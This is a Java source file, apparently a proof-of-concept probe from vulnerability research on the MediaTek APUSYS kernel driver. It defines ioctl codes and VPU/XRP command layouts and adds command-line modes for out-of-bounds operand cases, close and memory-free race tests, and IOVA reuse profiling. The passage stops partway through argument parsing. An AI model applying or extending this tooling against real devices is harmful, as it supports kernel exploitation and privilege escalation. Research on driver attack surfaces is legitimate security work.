/**
 * APUSYS ioctl reachability probe.
 *
 * Build this class together with DrmTrigger.java so it can reuse the pure-Java
 * syscall helper from the system_app dalvikvm context:
 *   javac -source 8 -target 8 -cp $ANDROID_JAR -d /tmp/apusys-build \
 *     07-cve-2023-32836-display-overflow/poc/DrmTrigger.java \
 *     13-apusys-ioctl-surface/poc/ApusysIoctlProbe.java
 */
public final class ApusysIoctlProbe {
    private static final String APUSYS_DEV = "/dev/apusys";

    private static final long APUSYS_CMD_HANDSHAKE   = 0xC0284100L;
    private static final long APUSYS_CMD_MEM_FREE_02 = 0xC0384102L;
    private static final long APUSYS_CMD_MEM_CREATE2 = 0xC0384103L;
    private static final long APUSYS_CMD_MEM_CREATE3 = 0xC038410FL;
    private static final long APUSYS_CMD_MEM_FREE_10 = 0xC0384110L;
    private static final long APUSYS_CMD_RUN_SYNC    = 0x40184106L;
    private static final long APUSYS_CMD_RUN_ASYNC   = 0xC0184107L;
    private static final long APUSYS_CMD_WAIT        = 0x40184108L;
    private static final long APUSYS_CMD_DEV_CTRL    = 0x400C4109L;
    private static final long APUSYS_CMD_UCMD        = 0x4014410EL;
    private static final long APUSYS_CMD_DISABLED_0C = 0x4038410CL;
    private static final long APUSYS_CMD_DISABLED_0D = 0x4038410DL;
    private static final long APUSYS_CMD_UNKNOWN     = 0x41414141L;

    private static final long DRM_IOCTL_PRIME_HANDLE_TO_FD = 0xC00C642DL;
    private static final long ION_IOC_ALLOC          = 0xC0204900L;
    private static final long ION_IOC_FREE           = 0xC0044901L;
    private static final long ION_IOC_SHARE          = 0xC0084904L;

    private static final int OFF_HANDSHAKE = 0x100;
    private static final int OFF_RUN_CMD   = 0x140;
    private static final int OFF_RUN_CMD_B = 0xe00;
    private static final int OFF_UCMD      = 0x180;
    private static final int OFF_MEM_A     = 0x1c0;
    private static final int OFF_MEM_B     = 0x220;
    private static final int OFF_DEV_CTRL  = 0x280;
    private static final int OFF_DRM_CREATE  = 0x300;
    private static final int OFF_DRM_PRIME   = 0x340;
    private static final int OFF_DRM_DESTROY = 0x360;
    private static final int OFF_MEM_DMABUF  = 0x380;
    private static final int OFF_ION_ALLOC   = 0x400;
    private static final int OFF_ION_SHARE   = 0x440;
    private static final int OFF_ION_FREE    = 0x460;
    private static final int OFF_MEM_REUSE_BASE = 0x500;
    private static final int OFF_MEM_REUSE_STRIDE = 0x40;
    private static final int MAX_REUSE_IMPORTS = 4;
    private static final int MAX_REUSE_PROFILE_IMPORTS = 32;
    private static final int REUSE_MARKER_BASE = 0x52555030; // "RUP0"

    private static final int RUN_CMD_PAYLOAD_ZERO = 0;
    private static final int RUN_CMD_PAYLOAD_INVALID_SC = 1;
    private static final int RUN_CMD_PAYLOAD_VPU_GUARD = 2;
    private static final int RUN_CMD_PAYLOAD_VPU_EXEC = 3;
    private static final int RUN_CMD_PAYLOAD_VPU_IOVA = 4;

    private static final int VPU_DESC_MINIMAL = 0;
    private static final int VPU_DESC_LIBVPU = 1;
    private static final int VPU_DESC_LIBVPU_ALIAS5 = 2;
    private static final int VPU_DESC_LIBVPU_CODE5 = 3;
    private static final int VPU_DESC_LIBVPU_MIXED5 = 4;
    private static final int VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST = 5;
    private static final int VPU_DESC_LIBVPU_SETTINGS5 = 6;
    private static final int VPU_DESC_ORDER_CODE_OUTPUT = 0;
    private static final int VPU_DESC_ORDER_OUTPUT_CODE = 1;
    private static final int VPU_REQUEST_FLAGS_DEFAULT = 0;
    private static final int VPU_REQUEST_FLAGS_PRELOAD_SLOT = 0x4;

    private static final int XRP_SETTINGS_OFF = 0x000;
    private static final int XRP_SETTINGS_LEN = 0x100;
    private static final int XRP_SETTINGS_LEN_WRAPPER = 0x68;
    private static final int XRP_CMD_FLAGS_INITIAL = 0x4;
    private static final int XRP_CMD_FLAGS_COMPLETE = 0x2;
    private static final int XRP_CMD_FLAGS_COMPLETE_SEND = 0x3;
    private static final int XRP_CMD_FLAGS_SEND = 0x5;
    private static final int XRP_CMD_FLAGS_SEND_ERROR = 0xd;
    private static final int XRP_CODE_OFF = 0x100;
    private static final int XRP_CODE_SIZE_ZERO = 0x00;
    private static final int XRP_CODE_OP_SIZE = 0x1c8;
    private static final int XRP_OPCODE_NONE = 0;
    private static final int XRP_OPCODE_GET_ALGO_INFO = 10001;
    private static final int XRP_OPCODE_LOCAL_MEM_INFO = 10002;
    private static final int XRP_OPCODE_XTENSA_ANN_VERSION = 10003;
    private static final int XRP_OPCODE_GET_DETAILED_OP_INFO = 10004;
    private static final int XRP_OUTPUT_OFF = 0x200;
    private static final int XRP_NZ_OUTPUT_OFF = 0x300;
    private static final int XRP_OUTPUT_SIZE = 0x80;
    private static final int XRP_OUTPUT_SIZE_WRAPPER_DEFAULT = 0x40;
    private static final int XRP_OUTPUT_SIZE_WRAPPER_ONE_OP = 0x44;
    private static final int XRP_OUTPUT_HEADER_FLAG_DEFAULT = 0;
    private static final int XRP_OUTPUT_HEADER_FLAG_SYNC = 1;
    private static final int XRP_DATA_DESC_OFF = 0x300;
    private static final int XRP_NZ_DATA_DESC_OFF = 0x400;
    private static final int XRP_DATA_DESC_SIZE = 0x0c;
    private static final int XRP_DATA_PAYLOAD_OFF = 0x400;
    private static final int XRP_NZ_DATA_PAYLOAD_OFF = 0x500;
    private static final int XRP_DATA_PAYLOAD_SIZE = 0x80;
    private static final int XRP_PLANE_PAYLOAD_OFF = 0x600;
    private static final int XRP_NZ_PLANE_PAYLOAD_OFF = 0x700;
    private static final int XRP_PLANE_PAYLOAD_SIZE = 0x80;
    private static final int VPU_REQUEST_OFF = 0x60;
    private static final int VPU_REQUEST_SIZE = 0xb70;
    private static final long XRP_COMPLETION_POLL_BUDGET_NS = 10_000_000L;
    private static final int XRP_COMPLETION_POLL_MAX_SAMPLES = 200000;
    private static final String[] XRP_COMPLETION_POLL_FIELDS = new String[] {
        "settings_flags", "settings_data_desc_ptr",
        "output0", "output10", "output3c", "data_desc0"
    };
    private static final byte[] XRP_CMD_MAGIC = new byte[] {
        (byte) 0xde, 0x63, (byte) 0xdb, (byte) 0xbe,
        0x4a, (byte) 0x99, 0x48, (byte) 0x89,
        (byte) 0x90, (byte) 0x83, (byte) 0xf0, 0x7b,
        (byte) 0xf8, 0x61, 0x09, 0x7a
    };

    private static final XrpOpSpec XRP_OP_NONE = new XrpOpSpec(
        "zero_code", "none", XRP_OPCODE_NONE, 0, 0, new int[0]);
    private static final XrpOpSpec XRP_OP_ANN_VERSION = new XrpOpSpec(
        "ann_version", "XTENSA_ANN_VERSION",
        XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1, new int[] { 0 });
    private static final XrpOpSpec[] XRP_OP_OPERAND_OFFSET_MATRIX =
        new XrpOpSpec[] {
            new XrpOpSpec("ann_version_operand_off0_out0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }, 0x00),
            new XrpOpSpec("ann_version_operand_off10_out0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }, 0x10),
            new XrpOpSpec("ann_version_operand_off40_out0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }, 0x40),
            new XrpOpSpec("ann_version_operand_off100_out0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }, 0x100),
            new XrpOpSpec("ann_version_operand_off17e_out0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }, 0x17e),
            new XrpOpSpec("ann_version_operand_off180_out0_oob",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }, 0x180, true),
        };
    private static final XrpOpSpec[] XRP_OP_MATRIX = new XrpOpSpec[] {
        new XrpOpSpec("get_algo_info_out0", "GET_ALGO_INFO",
            XRP_OPCODE_GET_ALGO_INFO, 0, 1, new int[] { 0 }),
        new XrpOpSpec("local_mem_info_out0", "LOCAL_MEM_INFO",
            XRP_OPCODE_LOCAL_MEM_INFO, 0, 1, new int[] { 0 }),
        new XrpOpSpec("ann_version_out0", "XTENSA_ANN_VERSION",
            XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1, new int[] { 0 }),
        new XrpOpSpec("detailed_op_info_out0", "GET_DETAILED_OP_INFO",
            XRP_OPCODE_GET_DETAILED_OP_INFO, 0, 1, new int[] { 0 }),
        new XrpOpSpec("ann_version_no_output", "XTENSA_ANN_VERSION",
            XRP_OPCODE_XTENSA_ANN_VERSION, 0, 0, new int[0]),
        new XrpOpSpec("ann_version_out1", "XTENSA_ANN_VERSION",
            XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1, new int[] { 1 })
    };
    private static final XrpOpSpec[] XRP_OP_EXTRA_CASES = new XrpOpSpec[] {
        new XrpOpSpec("ann_version_status_bit3_out0",
            "XTENSA_ANN_VERSION|status_bit3",
            XRP_OPCODE_XTENSA_ANN_VERSION | 0x8, 0, 1, new int[] { 0 })
    };

    private static final class XrpOpSpec {
        final String label;
        final String name;
        final int opcode;
        final int inputCount;
        final int outputCount;
        final int[] operandIds;
        final int operandListOffset;

        XrpOpSpec(String label, String name, int opcode, int inputCount,
                  int outputCount, int[] operandIds) {
            this(label, name, opcode, inputCount, outputCount, operandIds, 0);
        }

        XrpOpSpec(String label, String name, int opcode, int inputCount,
                  int outputCount, int[] operandIds, int operandListOffset) {
            this(label, name, opcode, inputCount, outputCount, operandIds,
                operandListOffset, false);
        }

        XrpOpSpec(String label, String name, int opcode, int inputCount,
                  int outputCount, int[] operandIds, int operandListOffset,
                  boolean allowOutOfBoundsOperandList) {
            if (operandIds.length != inputCount + outputCount) {
                throw new IllegalArgumentException("operand count mismatch");
            }
            if (!allowOutOfBoundsOperandList && (operandListOffset < 0
                    || 0x48 + operandListOffset + operandIds.length * 2
                    > XRP_CODE_OP_SIZE)) {
                throw new IllegalArgumentException("operand list out of entry");
            }
            this.label = label;
            this.name = name;
            this.opcode = opcode;
            this.inputCount = inputCount;
            this.outputCount = outputCount;
            this.operandIds = operandIds;
            this.operandListOffset = operandListOffset;
        }

        boolean hasCode() {
            return opcode != XRP_OPCODE_NONE;
        }
    }

    private static final class XrpSettingsShape {
        static final XrpSettingsShape CURRENT = new XrpSettingsShape(
            "current", XRP_OUTPUT_SIZE, XRP_DATA_DESC_SIZE, true);
        static final XrpSettingsShape WRAPPER_ZERO_DATA = new XrpSettingsShape(
            "wrapper_zero_data", XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0, false);
        static final XrpSettingsShape WRAPPER_ONE_DATA = new XrpSettingsShape(
            "wrapper_one_data", XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
            XRP_DATA_DESC_SIZE, true);
        static final XrpSettingsShape WRAPPER_ONE_DATA_OUTPUT44
            = new XrpSettingsShape("wrapper_one_data_output44",
                XRP_OUTPUT_SIZE_WRAPPER_ONE_OP, XRP_DATA_DESC_SIZE, true);

        final String label;
        final int outputSize;
        final int dataDescSize;
        final boolean includeDataDesc;
        final Integer codeSizeOverride;
        final VpuDescriptorPlaneOverride descriptorPlaneOverride;

        XrpSettingsShape(String label, int outputSize, int dataDescSize,
                         boolean includeDataDesc) {
            this(label, outputSize, dataDescSize, includeDataDesc,
                (Integer) null);
        }

        XrpSettingsShape(String label, int outputSize, int dataDescSize,
                         boolean includeDataDesc, Integer codeSizeOverride) {
            this(label, outputSize, dataDescSize, includeDataDesc,
                codeSizeOverride, null);
        }

        XrpSettingsShape(String label, int outputSize, int dataDescSize,
                         boolean includeDataDesc,
                         VpuDescriptorPlaneOverride descriptorPlaneOverride) {
            this(label, outputSize, dataDescSize, includeDataDesc, null,
                descriptorPlaneOverride);
        }

        XrpSettingsShape(String label, int outputSize, int dataDescSize,
                         boolean includeDataDesc, Integer codeSizeOverride,
                         VpuDescriptorPlaneOverride descriptorPlaneOverride) {
            this.label = label;
            this.outputSize = outputSize;
            this.dataDescSize = dataDescSize;
            this.includeDataDesc = includeDataDesc;
            this.codeSizeOverride = codeSizeOverride;
            this.descriptorPlaneOverride = descriptorPlaneOverride;
        }
    }

    private static final class XrpDataDescEntry {
        final int flags;
        final int size;
        final int iovaOffset;

        XrpDataDescEntry(int flags, int size, int iovaOffset) {
            this.flags = flags;
            this.size = size;
            this.iovaOffset = iovaOffset;
        }
    }

    private static final class XrpDataEntryCase {
        final String label;
        final XrpDataDescEntry[] entries;

        XrpDataEntryCase(String label, XrpDataDescEntry[] entries) {
            this.label = label;
            this.entries = entries;
        }
    }

    private static final class VpuDescriptorPlaneOverride {
        final Integer planeMvaOffset;
        final Integer word20;
        final Integer word24;
        final Integer word28;
        final Integer word34;
        final Integer byte38;
        final Integer byte39;
        final Integer byte3a;
        final Integer byte3b;

        VpuDescriptorPlaneOverride(Integer planeMvaOffset,
                                   Integer word20,
                                   Integer word24,
                                   Integer word28,
                                   Integer word34,
                                   Integer byte38,
                                   Integer byte39,
                                   Integer byte3a,
                                   Integer byte3b) {
            this.planeMvaOffset = planeMvaOffset;
            this.word20 = word20;
            this.word24 = word24;
            this.word28 = word28;
            this.word34 = word34;
            this.byte38 = byte38;
            this.byte39 = byte39;
            this.byte3a = byte3a;
            this.byte3b = byte3b;
        }

        String toLogString() {
            String s = "";
            if (planeMvaOffset != null) {
                s += " mva_off=0x" + Integer.toHexString(planeMvaOffset);
            }
            if (word20 != null) {
                s += " +20=0x" + Integer.toHexString(word20);
            }
            if (word24 != null) {
                s += " +24=0x" + Integer.toHexString(word24);
            }
            if (word28 != null) {
                s += " +28=0x" + Integer.toHexString(word28);
            }
            if (word34 != null) {
                s += " +34=0x" + Integer.toHexString(word34);
            }
            if (byte38 != null) {
                s += " +38=0x" + Integer.toHexString(byte38);
            }
            if (byte39 != null) {
                s += " +39=0x" + Integer.toHexString(byte39);
            }
            if (byte3a != null) {
                s += " +3a=0x" + Integer.toHexString(byte3a);
            }
            if (byte3b != null) {
                s += " +3b=0x" + Integer.toHexString(byte3b);
            }
            return s.length() == 0 ? " defaults" : s;
        }
    }

    private static final class VpuDescriptorPlaneCase {
        final String label;
        final Integer descriptorPayloadSize;
        final Integer descriptorPlaneCount;
        final Integer descriptorHeight;
        final XrpSettingsShape settingsShape;
        final XrpDataDescEntry[] dataDescEntries;

        VpuDescriptorPlaneCase(String label,
                               Integer descriptorPayloadSize,
                               Integer descriptorPlaneCount,
                               Integer descriptorHeight,
                               XrpSettingsShape settingsShape,
                               XrpDataDescEntry[] dataDescEntries) {
            this.label = label;
            this.descriptorPayloadSize = descriptorPayloadSize;
            this.descriptorPlaneCount = descriptorPlaneCount;
            this.descriptorHeight = descriptorHeight;
            this.settingsShape = settingsShape;
            this.dataDescEntries = dataDescEntries;
        }
    }

    private static final class ReplacementImport {
        final int index;
        android.media.ImageReader reader;
        android.media.ImageWriter writer;
        android.media.Image input;
        android.media.Image output;
        android.hardware.HardwareBuffer hb;
        long memDesc;
        int dmaBufFd = -1;
        int iovaLow;
        int iovaSize;
        boolean imported;

        ReplacementImport(int index) {
            this.index = index;
        }

        void closeQuietly() {
            if (hb != null) {
                try {
                    hb.close();
                } catch (Throwable ignored) {
                }
                hb = null;
            }
            if (output != null) {
                try {
                    output.close();
                } catch (Throwable ignored) {
                }
                output = null;
            }
            if (input != null) {
                try {
                    input.close();
                } catch (Throwable ignored) {
                }
                input = null;
            }
            if (writer != null) {
                try {
                    writer.close();
                } catch (Throwable ignored) {
                }
                writer = null;
            }
            if (reader != null) {
                try {
                    reader.close();
                } catch (Throwable ignored) {
                }
                reader = null;
            }
        }
    }

    private ApusysIoctlProbe() {
    }

    public static void main(String[] args) throws Exception {
        boolean query = false;
        boolean memNegative = false;
        boolean devCtrl = false;
        boolean memDmabuf = false;
        boolean memIon = false;
        boolean fdScan = false;
        boolean ucmdNegative = false;
        boolean hardwareBuffer = false;
        boolean ucmdHardwareBuffer = false;
        boolean runCmdHardwareBuffer = false;
        boolean runCmdInvalidSc = false;
        boolean runCmdVpuGuard = false;
        boolean runCmdVpuExec = false;
        boolean runCmdVpuIova = false;
        boolean runCmdVpuIovaControl = false;
        boolean runCmdVpuXrpIova = false;
        boolean runCmdVpuXrpIovaControl = false;
        boolean runCmdVpuXrpSplitIova = false;
        boolean runCmdVpuXrpSplitIovaControl = false;
        boolean runCmdVpuXrpAnnVersionIova = false;
        boolean runCmdVpuXrpAnnVersionIovaControl = false;
        boolean runCmdVpuXrpAnnVersionWrapperZeroDataIova = false;
        boolean runCmdVpuXrpAnnVersionWrapperZeroDataIovaControl = false;
        boolean runCmdVpuXrpAnnVersionWrapperZeroDataWaitIova = false;
        boolean runCmdVpuXrpInternalAnnVersionIova = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlags = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68 = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68Control = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperData = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44 = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44Control = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5 = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5Control = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsWaitIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsWordMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsWordMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsPortMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsPortMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIova = false;
        boolean runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsWaitIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsWaitIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIovaControl = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIova = false;
        boolean runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIovaControl = false;
        boolean runCmdVpuXrpCloseRaceIova = false;
        boolean runCmdVpuXrpCloseRaceDelayMatrixIova = false;
        boolean runCmdVpuXrpMemFreeRaceIova = false;
        boolean runCmdVpuXrpMemFreeRaceCompletedIova = false;
        boolean runCmdVpuXrpMemFreeRaceCompletedReuseIova = false;
        boolean runCmdVpuXrpMemFreeRaceCompletedGapReuseIova = false;
        boolean runCmdVpuXrpDevCtrlRaceIova = false;
        boolean runCmdVpuXrpDevCtrlMatrixIova = false;
        boolean runCmdVpuXrpTwoCommandSharedIova = false;
        boolean runCmdVpuXrpCompletedLatencyMatrixIova = false;
        boolean runCmdVpuXrpCompletionPollIova = false;
        boolean apusysIovaReuseProfiler = false;
        boolean apusysIovaGapProfiler = false;
        boolean apusysIovaGapControlProfiler = false;
        boolean apusysIovaGapPairSelectionProfiler = false;
        boolean apusysIovaGapPressureProfiler = false;
        boolean apusysIovaGapSourceProfiler = false;
        boolean apusysIovaGapFreeNeighborhoodProfiler = false;
        boolean apusysIovaGapLower2FocusProfiler = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlotControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrixControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrix = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrixControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReady = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReadyControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirst = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirstControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5 = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5Control = false;
        boolean runCmdVpuXrpOpMatrixIova = false;
        boolean runCmdVpuXrpOpMatrixIovaControl = false;
        XrpOpSpec runCmdVpuXrpOpCaseIova = null;
        XrpOpSpec runCmdVpuXrpOpCaseIovaControl = null;
        String ucmdKey = null;
        String ucmdKeyDump = null;
        for (String arg : args) {
            if ("--query".equals(arg)) {
                query = true;
            } else if ("--mem-negative".equals(arg)) {
                memNegative = true;
            } else if ("--dev-ctrl".equals(arg)) {
                devCtrl = true;
            } else if ("--mem-dmabuf".equals(arg)) {
                memDmabuf = true;
            } else if ("--mem-ion".equals(arg)) {
                memIon = true;
            } else if ("--fd-scan".equals(arg)) {
                fdScan = true;
            } else if ("--ucmd-negative".equals(arg)) {
                ucmdNegative = true;
            } else if ("--hardwarebuffer".equals(arg)) {
                hardwareBuffer = true;
            } else if ("--ucmd-hardwarebuffer".equals(arg)) {
                ucmdHardwareBuffer = true;
            } else if ("--run-cmd-hardwarebuffer".equals(arg)) {
                runCmdHardwareBuffer = true;
            } else if ("--run-cmd-invalid-sc".equals(arg)) {
                runCmdInvalidSc = true;
            } else if ("--run-cmd-vpu-guard".equals(arg)) {
                runCmdVpuGuard = true;
            } else if ("--run-cmd-vpu-exec".equals(arg)) {
                runCmdVpuExec = true;
            } else if ("--run-cmd-vpu-iova".equals(arg)) {
                runCmdVpuIova = true;
            } else if ("--run-cmd-vpu-iova-control".equals(arg)) {
                runCmdVpuIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-iova".equals(arg)) {
                runCmdVpuXrpIova = true;
            } else if ("--run-cmd-vpu-xrp-iova-control".equals(arg)) {
                runCmdVpuXrpIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-split-iova".equals(arg)) {
                runCmdVpuXrpSplitIova = true;
            } else if ("--run-cmd-vpu-xrp-split-iova-control".equals(arg)) {
                runCmdVpuXrpSplitIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-ann-version-iova".equals(arg)) {
                runCmdVpuXrpAnnVersionIova = true;
            } else if ("--run-cmd-vpu-xrp-ann-version-iova-control".equals(arg)) {
                runCmdVpuXrpAnnVersionIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-ann-version-wrapper-zero-data-iova".equals(arg)) {
                runCmdVpuXrpAnnVersionWrapperZeroDataIova = true;
            } else if ("--run-cmd-vpu-xrp-ann-version-wrapper-zero-data-iova-control".equals(arg)) {
                runCmdVpuXrpAnnVersionWrapperZeroDataIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-ann-version-wrapper-zero-data-wait-iova".equals(arg)) {
                runCmdVpuXrpAnnVersionWrapperZeroDataWaitIova = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIova = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlags = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-settings68".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68 = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-settings68-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68Control = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperData = true;
